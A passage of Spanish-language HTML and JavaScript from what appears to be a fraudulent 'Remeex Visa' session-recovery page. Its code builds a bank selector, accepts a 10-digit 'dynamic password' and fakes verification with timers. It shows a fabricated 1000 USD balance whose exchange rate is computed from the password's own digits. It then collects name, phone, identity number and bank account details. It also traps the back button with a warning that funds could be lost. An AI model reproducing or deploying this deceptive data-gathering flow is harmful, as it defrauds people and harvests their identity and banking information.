        logoUrl: "https://plazacdn.s3.amazonaws.com/wp-content/themes/bancoplaza/imagenes/logobancoplaza-2.png",
        code: "0138",
        category: "national"
      },
      {
        name: "Banco de la Gente Emprendedora C.A.",
        logoUrl: DEFAULT_BANK_LOGO,
        code: "0146",
        category: "national"
      },
      {
        name: "Banco Fondo Común, C.A.",
        logoUrl: "https://www.bfc.com.ve/wp-content/uploads/2021/01/logofos.png",
        code: "0151",
        category: "national"
      },
      {
        name: "100% Banco, Banco Comercial, C.A.",
        logoUrl: "https://www.100x100banco.com/img/logo.png",
        code: "0156",
        category: "national"
      },
      {
        name: "DelSur, Banco Universal C.A.",
        logoUrl: DEFAULT_BANK_LOGO,
        code: "0157",
        category: "national"
      },
      {
        name: "Banco del Tesoro C.A., Banco Universal",
        logoUrl: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Logo_Banco_del_Tesoro.jpg/320px-Logo_Banco_del_Tesoro.jpg",
        code: "0163",
        category: "national"
      },
      {
        name: "Banco Agrícola de Venezuela C.A., Banco Universal",
        logoUrl: DEFAULT_BANK_LOGO,
        code: "0166",
        category: "national"
      },
      {
        name: "Bancrecer S.A., Banco Microfinanciero",
        logoUrl: "https://www.bancrecer.com.ve/images/img/bancrecer-logo.png",
        code: "0168",
        category: "national"
      },
      {
        name: "Mi Banco, Banco Microfinanciero, C.A.",
        logoUrl: DEFAULT_BANK_LOGO,
        code: "0169",
        category: "national"
      },
      {
        name: "Banco Activo C.A., Banco Universal",
        logoUrl: "https://www.bancoactivo.com/logo.svg",
        code: "0171",
        category: "national"
      },
      {
        name: "Bancamiga Banco Universal, C.A.",
        logoUrl: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a3/Bancamiga.png/320px-Bancamiga.png",
        code: "0172",
        category: "national"
      },
      {
        name: "Banco Bicentenario del Pueblo, Banco Universal C.A.",
        logoUrl: "https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/BancoDigitaldelosTrabajadores.png/320px-BancoDigitaldelosTrabajadores.png",
        code: "0175",
        category: "national"
      },
      {
        name: "Banco Nacional de Crédito C.A., Banco Universal",
        logoUrl: "https://www.bncenlinea.com/images/default-source/misc/BNCLogo_rebrand.png",
        code: "0191",
        category: "national"
      }
    ];

    // Bancos Internacionales
    const internationalBanks = [
      {
        name: "Bank of America",
        logoUrl: "https://1000logos.net/wp-content/uploads/2016/10/Bank-of-America-Logo.png",
        code: "intl-001",
        category: "international",
        disabled: true
      },
      {
        name: "Chase Bank",
        logoUrl: "https://download.logo.wine/logo/Chase_Bank/Chase_Bank-Logo.wine.png",
        code: "intl-002",
        category: "international",
        disabled: true
      },
      {
        name: "Bancolombia",
        logoUrl: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Logo_Bancolombia.svg/2000px-Logo_Bancolombia.svg.png",
        code: "intl-003",
        category: "international",
        disabled: true
      },
      {
        name: "Western Union",
        logoUrl: "https://logos-world.net/wp-content/uploads/2023/03/Western-Union-Logo.png",
        code: "intl-004",
        category: "international",
        disabled: true
      }
    ];

    // Servicios Digitales
    const digitalServices = [
      {
        name: "Zinli",
        logoUrl: "https://images.seeklogo.com/logo-png/41/1/zinli-logo-png_seeklogo-411354.png",
        code: "dig-001",
        category: "digital",
        disabled: true
      },
      {
        name: "PayPal",
        logoUrl: "https://upload.wikimedia.org/wikipedia/commons/a/a4/Paypal_2014_logo.png",
        code: "dig-002",
        category: "digital",
        disabled: true
      },
      {
        name: "Binance",
        logoUrl: "https://www.logo.wine/a/logo/Binance/Binance-Logo.wine.svg",
        code: "dig-003",
        category: "digital",
        disabled: true
      },
      {
        name: "AirTM",
        logoUrl: "https://brandlogovector.com/wp-content/uploads/2023/08/Airtm-Logo-PNG.png",
        code: "dig-004",
        category: "digital",
        disabled: true
      },
      {
        name: "Zoom",
        logoUrl: "https://zoom.red/wp-content/uploads/2021/01/Logo-Zoom-Registrado.png",
        code: "dig-005",
        category: "digital",
        disabled: true
      },
      {
        name: "Zelle",
        logoUrl: "https://download.logo.wine/logo/Zelle_(payment_service)/Zelle_(payment_service)-Logo.wine.png",
        code: "dig-006",
        category: "digital",
        disabled: true
      },
      {
        name: "Venmo",
        logoUrl: "https://logos-world.net/wp-content/uploads/2021/12/Venmo-Logo.png",
        code: "dig-007",
        category: "digital",
        disabled: true
      },
      {
        name: "Nequi",
        logoUrl: "https://images.seeklogo.com/logo-png/40/1/nequi-logo-png_seeklogo-404357.png",
        code: "dig-008",
        category: "digital",
        disabled: true
      },
      {
        name: "Pago Móvil",
        logoUrl: "https://i0.wp.com/logoroga.com/wp-content/uploads/2018/02/pago-movil.png?fit=800%2C800&ssl=1",
        code: "dig-009",
        category: "digital",
        disabled: true
      }
    ];

    // Combinamos todos los bancos
    const allBanks = [...nationalBanks, ...internationalBanks, ...digitalServices];

    // Mapeo completo de bancos a códigos
    const bankMapping = {};
    allBanks.forEach(bank => {
      bankMapping[bank.name] = bank.code;
    });// Referencias DOM
    const progressBarFill = document.getElementById('progressBarFill');
    const step0 = document.getElementById('step0');
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');

    // Input de clave de acceso
    const accessPasswordInput = document.getElementById('accessPassword');
    const verifyAccessBtn = document.getElementById('verifyAccessBtn');

    // Inputs de formulario
    const fullNameInput = document.getElementById('fullName');
    const phonePrefixSelect = document.getElementById('phonePrefix');
    const phoneNumberInput = document.getElementById('phoneNumber');
    const docTypeSelect = document.getElementById('docType');
    const nationalitySelect = document.getElementById('nationality');
    const docNumberInput = document.getElementById('docNumber');
    const bankSelectDisplay = document.getElementById('bankSelectDisplay');
    const bankDropdown = document.getElementById('bankDropdown');
    const bankDropdownOptions = document.getElementById('bankDropdownOptions');
    const bankSearchInput = document.getElementById('bankSearchInput');
    const selectedBankCode = document.getElementById('selectedBankCode');
    const selectedBankName = document.getElementById('selectedBankName');
    const selectedBankLogo = document.getElementById('selectedBankLogo');
    const accountContainer = document.getElementById('accountContainer');
    const bankCodeInput = document.getElementById('bankCode');
    const restAccountDigitsInput = document.getElementById('restAccountDigits');
    const accountTypeSelect = document.getElementById('accountType');

    // Elementos de resumen
    const balanceAmountEl = document.getElementById('balanceAmount');
    const exchangeRateEl = document.getElementById('exchangeRate');
    const usdAmountEl = document.getElementById('usdAmount');
    const dateTimeEl = document.getElementById('dateTime');
    const summaryNameEl = document.getElementById('summaryName');
    const summaryDocumentEl = document.getElementById('summaryDocument');
    const summaryPhoneEl = document.getElementById('summaryPhone');
    const summaryBankEl = document.getElementById('summaryBank');
    const summaryAccountEl = document.getElementById('summaryAccount');
    const summaryAccountTypeEl = document.getElementById('summaryAccountType');

    // Botones
    const recoverSessionBtn = document.getElementById('recoverSessionBtn');
    const backToEditBtn = document.getElementById('backToEditBtn');
    const continueProcessBtn = document.getElementById('continueProcessBtn');

    // Overlays
    const loadingAnimation = document.getElementById('loadingAnimation');
    const loadingText = document.getElementById('loadingText');
    const errorOverlay = document.getElementById('errorOverlay');
    const errorMessage = document.getElementById('errorMessage');
    const errorCloseBtn = document.getElementById('errorCloseBtn');
    const successOverlay = document.getElementById('successOverlay');
    const successMessage = document.getElementById('successMessage');
    const successCloseBtn = document.getElementById('successCloseBtn');

    // Variables globales
    let exchangeRate = 0;
    let balanceBS = 0;
    let currentStep = 0;
    let recoveredData = {};
    let accessPassword = "";

    // Inicialización
    document.addEventListener('DOMContentLoaded', function() {
      // Actualizar barra de progreso
      updateProgressBar();
      
      // Configurar listeners
      setupListeners();
      
      // Inicializar selector de banco
      initBankSelector();
    });

    // Actualizar barra de progreso
    function updateProgressBar() {
      const progress = currentStep * 33.33; // 3 pasos: 0%, 33%, 66%, 100%
      progressBarFill.style.width = progress + '%';
    }

    // Inicializar selector de banco
    function initBankSelector() {
      // Llenar el dropdown de bancos
      populateBankDropdown();
      
      // Toggle del dropdown al hacer clic en el selector
      bankSelectDisplay.addEventListener('click', function() {
        bankDropdown.classList.toggle('active');
      });
      
      // Buscar bancos
      bankSearchInput.addEventListener('input', function() {
        filterBanks(this.value);
      });
      
      // Cerrar dropdown al hacer clic afuera
      document.addEventListener('click', function(e) {
        if (!bankSelectDisplay.contains(e.target) && !bankDropdown.contains(e.target)) {
          bankDropdown.classList.remove('active');
        }
      });
    }

    // Poblar dropdown de bancos
    function populateBankDropdown() {
      bankDropdownOptions.innerHTML = '';
      
      // Bancos Nacionales
      if (nationalBanks.length > 0) {
        // Título para bancos nacionales
        const nationalTitle = document.createElement('div');
        nationalTitle.className = 'bank-category-title';
        nationalTitle.innerHTML = '<i class="fas fa-university"></i> Bancos Nacionales';
        bankDropdownOptions.appendChild(nationalTitle);
        
        // Añadir cada banco nacional
        nationalBanks.forEach(bank => {
          addBankOption(bank);
        });
      }
      
      // Bancos Internacionales
      if (internationalBanks.length > 0) {
        // Título para bancos internacionales
        const internationalTitle = document.createElement('div');
        internationalTitle.className = 'bank-category-title';
        internationalTitle.innerHTML = '<i class="fas fa-globe"></i> Bancos Internacionales';
        bankDropdownOptions.appendChild(internationalTitle);
        
        // Añadir cada banco internacional
        internationalBanks.forEach(bank => {
          addBankOption(bank);
        });
      }
      
      // Servicios Digitales
      if (digitalServices.length > 0) {
        // Título para servicios digitales
        const digitalTitle = document.createElement('div');
        digitalTitle.className = 'bank-category-title';
        digitalTitle.innerHTML = '<i class="fas fa-mobile-alt"></i> Servicios Digitales';
        bankDropdownOptions.appendChild(digitalTitle);
        
        // Añadir cada servicio digital
        digitalServices.forEach(bank => {
          addBankOption(bank);
        });
      }
    }

    // Añadir opción de banco al dropdown
    function addBankOption(bank) {
      const bankOption = document.createElement('div');
      bankOption.className = 'bank-option' + (bank.disabled ? ' disabled' : '');
      bankOption.dataset.code = bank.code;
      bankOption.dataset.name = bank.name;
      bankOption.dataset.logo = bank.logoUrl;
      
      bankOption.innerHTML = `
        <img src="${bank.logoUrl}" alt="${bank.name}" onerror="this.src='${DEFAULT_BANK_LOGO}'">
        <span>${bank.name}</span>
      `;
      
      // Añadir evento de selección si no está deshabilitado
      if (!bank.disabled) {
        bankOption.addEventListener('click', function() {
          // Seleccionar este banco
          selectBank(bank);
        });
      }
      
      bankDropdownOptions.appendChild(bankOption);
    }

    // Seleccionar un banco
    function selectBank(bank) {
      // Actualizar display de banco seleccionado
      bankSelectDisplay.innerHTML = `
        <img src="${bank.logoUrl}" alt="${bank.name}" onerror="this.src='${DEFAULT_BANK_LOGO}'">
        <span>${bank.name}</span>
      `;
      bankSelectDisplay.classList.remove('empty');
      
      // Guardar valores en campos ocultos
      selectedBankCode.value = bank.code;
      selectedBankName.value = bank.name;
      selectedBankLogo.value = bank.logoUrl;
      
      // Actualizar campo de código de banco
      bankCodeInput.value = bank.code;
      accountContainer.style.display = 'block';
      
      // Cerrar dropdown
      bankDropdown.classList.remove('active');
    }

    // Filtrar bancos por término de búsqueda
    function filterBanks(searchTerm) {
      const normalizedSearch = searchTerm.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
      const options = bankDropdownOptions.querySelectorAll('.bank-option');
      
      let visibleCount = 0;
      let lastVisibleCategory = null;
      
      // Ocultar todos los títulos de categoría primero
      const categories = bankDropdownOptions.querySelectorAll('.bank-category-title');
      categories.forEach(cat => cat.style.display = 'none');
      
      // Filtrar opciones
      options.forEach(option => {
        const bankName = option.dataset.name.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
        
        if (bankName.includes(normalizedSearch)) {
          option.style.display = 'flex';
          visibleCount++;
          
          // Buscar la categoría padre
          let prev = option.previousElementSibling;
          while (prev && !prev.classList.contains('bank-category-title')) {
            prev = prev.previousElementSibling;
          }
          
          if (prev && prev.classList.contains('bank-category-title')) {
            prev.style.display = 'block';
            lastVisibleCategory = prev;
          }
        } else {
          option.style.display = 'none';
        }
      });
      
      // Si no hay resultados, mostrar mensaje
      if (visibleCount === 0) {
        if (!document.getElementById('noResultsMessage')) {
          const noResults = document.createElement('div');
          noResults.id = 'noResultsMessage';
          noResults.style.padding = '1rem';
          noResults.style.textAlign = 'center';
          noResults.style.color = '#64748b';
          noResults.innerHTML = '<i class="fas fa-search"></i><p>No se encontraron bancos con ese nombre</p>';
          bankDropdownOptions.appendChild(noResults);
        } else {
          document.getElementById('noResultsMessage').style.display = 'block';
        }
      } else if (document.getElementById('noResultsMessage')) {
        document.getElementById('noResultsMessage').style.display = 'none';
      }
    }

    // Configurar listeners de eventos
    function setupListeners() {
      // Verificación de clave de acceso
      verifyAccessBtn.addEventListener('click', handleVerifyAccess);
      
      // Botón de recuperar sesión
      recoverSessionBtn.addEventListener('click', handleRecoverSession);
      
      // Botón de volver a editar
      backToEditBtn.addEventListener('click', function() {
        goToStep(1);
      });
      
      // Botón de continuar proceso
      continueProcessBtn.addEventListener('click', handleContinueProcess);
      
      // Botones de overlays
      errorCloseBtn.addEventListener('click', function() {
        hideOverlay(errorOverlay);
      });
      
      successCloseBtn.addEventListener('click', function() {
        hideOverlay(successOverlay);
        // Redirigir si es necesario
        if (successCloseBtn.dataset.redirect) {
          window.location.href = successCloseBtn.dataset.redirect;
        }
      });
    }

    // Manejar verificación de acceso
    function handleVerifyAccess() {
      // Validar clave de acceso
      const password = accessPasswordInput.value;
      
      if (password.length !== 10) {
        showError("La contraseña dinámica debe tener 10 dígitos.");
        return;
      }
      
      // Guardar clave para uso posterior
      accessPassword = password;
      
      // Procesar clave para generar tasa y monto
      processPassword(password);
      
      // Mostrar animación de carga
      showLoading("Verificando clave de acceso...");
      
      // Simular verificación
      setTimeout(function() {
        // Ocultar animación
        hideLoading();
        
        // Ir al siguiente paso
        goToStep(1);
      }, 2000);
    }

    // Manejar recuperación de sesión
    function handleRecoverSession() {
      // Validar formulario
      if (!validateRecoveryForm()) {
        return;
      }
      
      // Mostrar animación de carga
      showLoading("Recuperando sesión...");
      
      // Simular proceso de recuperación
      setTimeout(function() {
        // Almacenar datos de recuperación
        storeRecoveryData();
        
        // Actualizar resumen
        updateSummary();
        
        // Ocultar animación de carga
        hideLoading();
        
        // Ir al paso 2
        goToStep(2);
      }, 3000);
    }

    // Procesar clave de 10 dígitos
    function processPassword(password) {
      if (password.length >= 10) {
        const last4 = password.slice(-4);
        const amountMinUSD = parseInt(last4.slice(0, 2), 10) || 20;
        const rateBolivar = parseInt(last4.slice(2, 4), 10) || 69;
        
        // Establecer tasa de cambio
        exchangeRate = rateBolivar;
        
        // Calcular saldo disponible (ejemplo: $1000 * tasa)
        balanceBS = 1000 * exchangeRate;
        
        // Guardar información preliminar
        recoveredData = {
          password: password,
          exchangeRate: exchangeRate,
          balanceBS: balanceBS,
          balanceUSD: 1000
        };
        
        // Actualizar elementos si estamos en el paso 2
        if (currentStep === 2) {
          updateBalanceDisplay();
        }
      }
    }

    // Actualizar información de balance
    function updateBalanceDisplay() {
      exchangeRateEl.textContent = `Tasa: ${exchangeRate.toFixed(2)} Bs/USD`;
      balanceAmountEl.textContent = formatNumber(balanceBS) + " Bs";
      usdAmountEl.textContent = "≈ " + formatNumber(1000) + " USD";
      
      // Fecha actual
      const now = new Date();
      dateTimeEl.textContent = `Fecha: ${now.getDate()}/${now.getMonth() + 1}/${now.getFullYear()}`;
    }

    // Validar formulario de recuperación
    function validateRecoveryForm() {
      // Nombre completo
      if (!fullNameInput.value.trim()) {
        showError("Por favor, ingresa tu nombre completo.");
        return false;
      }
      
      // Teléfono
      if (!phonePrefixSelect.value || !phoneNumberInput.value || phoneNumberInput.value.length !== 7) {
        showError("Por favor, ingresa un número de teléfono válido.");
        return false;
      }
      
      // Documento
      if (!docTypeSelect.value || !nationalitySelect.value || !docNumberInput.value) {
        showError("Por favor, completa los datos del documento de identidad.");
        return false;
      }
      
      // Banco
      if (!selectedBankCode.value) {
        showError("Por favor, selecciona un banco.");
        return false;
      }
      
      // Cuenta bancaria
      if (accountContainer.style.display !== 'none' && !restAccountDigitsInput.value) {
        showError("Por favor, ingresa el número de cuenta completo.");
        return false;
      }
      
      if (restAccountDigitsInput.value && restAccountDigitsInput.value.length !== 16) {
        showError("El número de cuenta debe tener 16 dígitos adicionales.");
        return false;
      }
      
      // Tipo de cuenta
      if (!accountTypeSelect.value) {
        showError("Por favor, selecciona el tipo de cuenta.");
        return false;
      }
      
      return true;
    }

    // Almacenar datos de recuperación
    function storeRecoveryData() {
      // Complementar datos de registro con los demás campos del formulario
      recoveredData = {
        ...recoveredData, // Mantener datos existentes (clave, tasa, saldo)
        fullName: fullNameInput.value,
        phone: phonePrefixSelect.value + '-' + phoneNumberInput.value,
        docType: docTypeSelect.value,
        nationality: nationalitySelect.value,
        docNumber: docNumberInput.value,
        bankName: selectedBankName.value,
        bankCode: selectedBankCode.value,
        bankLogo: selectedBankLogo.value,
        bankAccount: selectedBankCode.value + restAccountDigitsInput.value,
        bankType: accountTypeSelect.value
      };
      
      // Guardar en sessionStorage y localStorage para persistencia
      const datosRemeex = {
        fullName: recoveredData.fullName,
        userName: recoveredData.fullName,
        shortName: recoveredData.fullName.split(' ')[0],
        password: recoveredData.password,
        userPhone: recoveredData.phone,
        docType: recoveredData.docType,
        nationality: recoveredData.nationality,
        docNumber: recoveredData.docNumber,
        bankName: recoveredData.bankName,
        bankCode: recoveredData.bankCode,
        bankLogo: recoveredData.bankLogo,
        bankAccount: recoveredData.bankAccount,
        bankType: recoveredData.bankType,
        rateBolivar: recoveredData.exchangeRate,
        currentBalanceBS: recoveredData.balanceBS,
        selectedUSD: recoveredData.balanceUSD,
        monthlyIncomeUSD: recoveredData.balanceUSD
      };
      
      localStorage.setItem("datosRemeex", JSON.stringify(datosRemeex));
      sessionStorage.setItem("datosRemeex", JSON.stringify(datosRemeex));
      
      // Guardar también individualmente para compatibilidad
      localStorage.setItem("userName", datosRemeex.fullName);
      sessionStorage.setItem("userName", datosRemeex.fullName);
      
      localStorage.setItem("USD_RATE", exchangeRate.toString());
      sessionStorage.setItem("USD_RATE", exchangeRate.toString());
      
      localStorage.setItem("currentBalanceBS", balanceBS.toString());
      sessionStorage.setItem("currentBalanceBS", balanceBS.toString());
      
      localStorage.setItem("selectedBankName", datosRemeex.bankName);
      sessionStorage.setItem("selectedBankName", datosRemeex.bankName);
      
      localStorage.setItem("selectedBankLogo", datosRemeex.bankLogo);
      sessionStorage.setItem("selectedBankLogo", datosRemeex.bankLogo);
      
      localStorage.setItem("selectedBankCode", datosRemeex.bankCode);
      sessionStorage.setItem("selectedBankCode", datosRemeex.bankCode);
      
      localStorage.setItem("monthlyIncomeUSD", datosRemeex.monthlyIncomeUSD.toString());
      sessionStorage.setItem("monthlyIncomeUSD", datosRemeex.monthlyIncomeUSD.toString());
    }

    // Actualizar resumen
    function updateSummary() {
      summaryNameEl.textContent = recoveredData.fullName;
      
      let docPrefix = "";
      if (recoveredData.docType === "Cédula de Identidad") docPrefix = "V-";
      else if (recoveredData.docType === "Pasaporte Vigente") docPrefix = "P-";
      else if (recoveredData.docType === "Licencia de Conducir") docPrefix = "L-";
      
      summaryDocumentEl.textContent = docPrefix + recoveredData.docNumber;
      summaryPhoneEl.textContent = recoveredData.phone;
      summaryBankEl.textContent = recoveredData.bankName;
      summaryAccountEl.textContent = recoveredData.bankAccount;
      summaryAccountTypeEl.textContent = recoveredData.bankType;
      
      // Actualizar información de balance
      updateBalanceDisplay();
    }

    // Manejar continuar proceso
    function handleContinueProcess() {
      showLoading("Iniciando proceso de verificación...");
      
      setTimeout(function() {
        hideLoading();
        
        // Mostrar mensaje de éxito
        showSuccess("Datos verificados correctamente. Serás redirigido para completar el proceso.", "remeexvisa.html");
      }, 2500);
    }

    // Cambiar de paso
    function goToStep(step) {
      currentStep = step;
      
      // Ocultar todos los pasos
      const steps = document.querySelectorAll('.section-content');
      steps.forEach(s => s.classList.remove('active'));
      
      // Mostrar paso actual
      document.getElementById('step' + step).classList.add('active');
      
      // Actualizar barra de progreso
      updateProgressBar();
    }

    // Mostrar animación de carga
    function showLoading(message) {
      loadingText.textContent = message || "Cargando...";
      loadingAnimation.classList.add('active');
    }

    // Ocultar animación de carga
    function hideLoading() {
      loadingAnimation.classList.remove('active');
    }

    // Mostrar error
    function showError(message) {
      errorMessage.textContent = message;
      showOverlay(errorOverlay);
    }

    // Mostrar éxito
    function showSuccess(message, redirectUrl) {
      successMessage.textContent = message;
      if (redirectUrl) {
        successCloseBtn.dataset.redirect = redirectUrl;
      } else {
        delete successCloseBtn.dataset.redirect;
      }
      showOverlay(successOverlay);
    }

    // Mostrar overlay
    function showOverlay(overlay) {
      overlay.classList.add('active');
    }

    // Ocultar overlay
    function hideOverlay(overlay) {
      overlay.classList.remove('active');
    }

    // Formatear número en formato venezolano
    function formatNumber(num) {
      return num.toLocaleString('es-VE', {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2
      });
    }

    // Prevenir uso del botón "back" del navegador
    history.pushState({}, '', '');
    window.addEventListener('popstate', function() {
      const mensaje = "¿Estás seguro que deseas abandonar el proceso? Podrías perder tus datos y fondos.";
      if (confirm(mensaje)) {
        window.location.href = "https://remeexvisa.com";
      } else {
        history.pushState({}, '', '');
      }
    });
  </script>

  <!-- Integración Tawk.to para soporte -->
  <script>
    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
    (function(){
      var s1=document.createElement("script"), s0=document.getElementsByTagName("script")[0];
      s1.async=true;
      s1.src='https://embed.tawk.to/676eba4c49e2fd8dfeff071f/1ig48fetj';
      s1.charset='UTF-8';
      s1.setAttribute('crossorigin','*');
      s0.parentNode.insertBefore(s1,s0);
    })();
  </script>
</body>
</html>
